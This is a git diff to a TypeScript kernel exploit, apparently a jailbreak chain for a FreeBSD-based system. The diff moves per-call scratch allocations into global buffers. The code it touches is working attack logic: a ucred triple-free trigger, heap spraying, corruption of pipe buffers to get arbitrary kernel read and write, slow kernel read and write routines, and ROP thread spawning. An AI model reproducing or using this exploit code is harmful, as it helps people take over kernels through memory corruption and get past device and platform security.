@@ -205,7 +205,6 @@ const spray_ipv6_ready = malloc(8)
 const spray_ipv6_done = malloc(8)
 const spray_ipv6_signal_buf = malloc(8)
 const spray_ipv6_stack = malloc(0x2000)
-const spray_ipv6_triplet_stack = malloc(0x2000)
 
 interface Worker {
   rop: BigInt[]
@@ -268,6 +267,16 @@ function set_sockopt (sd: BigInt, level: number, optname: number, optval: BigInt
 // Global buffer to minimize footprint
 const sockopt_len_ptr = malloc(4)
 
+const nanosleep_timespec = malloc(0x10)
+const cpu_mask_buf = malloc(0x10)
+const rtprio_scratch = malloc(0x4)
+const sockopt_val_buf = malloc(4)
+const nc_set_buf = malloc(8)
+const nc_clear_buf = malloc(8)
+const spawn_thr_args = malloc(0x80)
+const spawn_tid = malloc(0x8)
+const spawn_cpid = malloc(0x8)
+
 function get_sockopt (sd: BigInt, level: number, optname: number, optval: BigInt, optlen: number) {
   // const len_ptr = malloc(4);
   write32(sockopt_len_ptr, optlen)
@@ -307,9 +316,8 @@ function free_rthdr (sd: BigInt) {
 }
 
 function pin_to_core (core: number) {
-  const mask = malloc(0x10)
-  write32(mask, 1 << core)
-  cpuset_setaffinity(3, 1, BigInt_Error, 0x10, mask)
+  write32(cpu_mask_buf, 1 << core)
+  cpuset_setaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf)
 }
 
 function get_core_index (mask_addr: BigInt) {
@@ -323,24 +331,21 @@ function get_core_index (mask_addr: BigInt) {
 }
 
 function get_current_core () {
-  const mask = malloc(0x10)
-  cpuset_getaffinity(3, 1, BigInt_Error, 0x10, mask)
-  return get_core_index(mask)
+  cpuset_getaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf)
+  return get_core_index(cpu_mask_buf)
 }
 
 function set_rtprio (prio: number) {
-  const rtprio = malloc(0x4)
-  write16(rtprio, PRI_REALTIME)
-  write16(rtprio.add(2), prio)
-  rtprio_thread(RTP_SET, 0, rtprio)
+  write16(rtprio_scratch, PRI_REALTIME)
+  write16(rtprio_scratch.add(2), prio)
+  rtprio_thread(RTP_SET, 0, rtprio_scratch)
 }
 
 function get_rtprio () {
-  const rtprio = malloc(0x4)
-  write16(rtprio, PRI_REALTIME)
-  write16(rtprio.add(2), 0)
-  rtprio_thread(RTP_LOOKUP, 0, rtprio)
-  return Number(read16(rtprio.add(2)))
+  write16(rtprio_scratch, PRI_REALTIME)
+  write16(rtprio_scratch.add(2), 0)
+  rtprio_thread(RTP_LOOKUP, 0, rtprio_scratch)
+  return Number(read16(rtprio_scratch.add(2)))
 }
 
 function create_workers () {
@@ -485,10 +490,9 @@ function init_workers () {
 }
 
 function nanosleep_fun (nsec: number) {
-  const timespec = malloc(0x10)
-  write64(timespec, Math.floor(nsec / 1e9))    // tv_sec
-  write64(timespec.add(8), nsec % 1e9)         // tv_nsec
-  nanosleep(timespec)
+  write64(nanosleep_timespec, Math.floor(nsec / 1e9))    // tv_sec
+  write64(nanosleep_timespec.add(8), nsec % 1e9)         // tv_nsec
+  nanosleep(nanosleep_timespec)
 }
 
 function wait_for (addr: BigInt, threshold: number) {
@@ -953,7 +957,6 @@ function setup_arbitrary_rw () {
   debug('victim_r_pipe_data: ' + hex(victim_r_pipe_data))
 
   // Corrupt pipebuf of masterRpipeFd.
-  master_pipe_buf = malloc(PIPEBUF_SIZE)
   write32(master_pipe_buf.add(0x00), 0)                // cnt
   write32(master_pipe_buf.add(0x04), 0)                // in
   write32(master_pipe_buf.add(0x08), 0)                // out
@@ -991,14 +994,12 @@ function setup_arbitrary_rw () {
 }
 
 function find_allproc () {
-  const pipe_fd = malloc(8)
-  pipe(pipe_fd)
-  const pipe_0 = read32(pipe_fd)
-  const pipe_1 = read32(pipe_fd.add(0x04))
+  pipe(pipe_sock)
+  const pipe_0 = read32(pipe_sock)
+  const pipe_1 = read32(pipe_sock.add(0x04))
 
-  const curr_pid = malloc(4)
-  write32(curr_pid, Number(getpid()))
-  ioctl(new BigInt(pipe_0), FIOSETOWN, curr_pid)
+  write32(sockopt_val_buf, Number(getpid()))
+  ioctl(new BigInt(pipe_0), FIOSETOWN, sockopt_val_buf)
 
   const fp = fget(pipe_0)
   const f_data = kread64(fp.add(0x00))
@@ -1165,8 +1166,6 @@ function remove_uaf_file () {
 
 function trigger_ucred_triplefree () {
   let end = false
-  const set_buf = malloc(8)
-  const clear_buf = malloc(8)
 
   write64(msgIov.add(0x0), 1) // iov_base
   write64(msgIov.add(0x8), 1) // iov_len
@@ -1180,8 +1179,8 @@ function trigger_ucred_triplefree () {
     const dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0)
 
     // Register dummy socket.
-    write32(set_buf, Number(dummy_socket.and(0xFFFFFFFF)))
-    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, set_buf, 8)
+    write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)))
+    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8)
 
     // Close the dummy socket.
     close(new BigInt(dummy_socket))
@@ -1196,8 +1195,8 @@ function trigger_ucred_triplefree () {
     setuid(1)
 
     // Unregister dummy socket and free the file and ucred.
-    write32(clear_buf, uaf_socket)
-    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clear_buf, 8)
+    write32(nc_clear_buf, uaf_socket)
+    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8)
 
     // Set cr_refcnt back to 1.
     for (let i = 0; i < 32; i++) {
@@ -1400,9 +1399,8 @@ function kreadslow (addr: BigInt, size: number) {
   }
 
   // Set send buf size.
-  const buf_size = malloc(4)
-  write32(buf_size, size)
-  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, buf_size, 4)
+  write32(sockopt_val_buf, size)
+  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4)
 
   // Fill queue.
   write(new BigInt(uio_sock_1), tmp, size)
@@ -1546,9 +1544,8 @@ function kwriteslow (addr: BigInt, buffer: BigInt, size: number) {
   debug('Enter kwriteslow addr: ' + hex(addr) + ' buffer: ' + hex(buffer) + ' size : ' + size)
 
   // Set send buf size.
-  const buf_size = malloc(4)
-  write32(buf_size, size)
-  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, buf_size, 4)
+  write32(sockopt_val_buf, size)
+  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4)
 
   // Set iov length.
   write64(uioIovWrite.add(0x08), size)
@@ -1699,27 +1696,24 @@ function spawn_thread (rop_array: BigInt[], loop_entries: number, predefinedStac
   const stack_size = new BigInt(0x100)
   const tls_size = new BigInt(0x40)
 
-  const thr_new_args = malloc(0x80)
-  const tid_addr = malloc(0x8)
-  const cpid = malloc(0x8)
   const stack = malloc(Number(stack_size))
   const tls = malloc(Number(tls_size))
 
-  write64(thr_new_args.add(0x00), longjmp_addr)       // start_func = longjmp
-  write64(thr_new_args.add(0x08), jmpbuf)             // arg = jmpbuf
-  write64(thr_new_args.add(0x10), stack)              // stack_base
-  write64(thr_new_args.add(0x18), stack_size)         // stack_size
-  write64(thr_new_args.add(0x20), tls)                // tls_base
-  write64(thr_new_args.add(0x28), tls_size)           // tls_size
-  write64(thr_new_args.add(0x30), tid_addr)           // child_tid (output)
-  write64(thr_new_args.add(0x38), cpid)               // parent_tid (output)
+  write64(spawn_thr_args.add(0x00), longjmp_addr)       // start_func = longjmp
+  write64(spawn_thr_args.add(0x08), jmpbuf)             // arg = jmpbuf
+  write64(spawn_thr_args.add(0x10), stack)              // stack_base
+  write64(spawn_thr_args.add(0x18), stack_size)         // stack_size
+  write64(spawn_thr_args.add(0x20), tls)                // tls_base
+  write64(spawn_thr_args.add(0x28), tls_size)           // tls_size
+  write64(spawn_thr_args.add(0x30), spawn_tid)           // child_tid (output)
+  write64(spawn_thr_args.add(0x38), spawn_cpid)               // parent_tid (output)
 
-  const result = thr_new(thr_new_args, 0x68)
+  const result = thr_new(spawn_thr_args, 0x68)
   // debug("thr_new result: " + hex(result));
   if (!result.eq(0)) {
     throw new Error('thr_new failed: ' + hex(result))
   }
-  return read64(tid_addr)
+  return read64(spawn_tid)
 }
 
 function iov_recvmsg_worker_rop (ready_signal: BigInt, run_fd: BigInt, done_signal: BigInt, signal_buf: BigInt) {
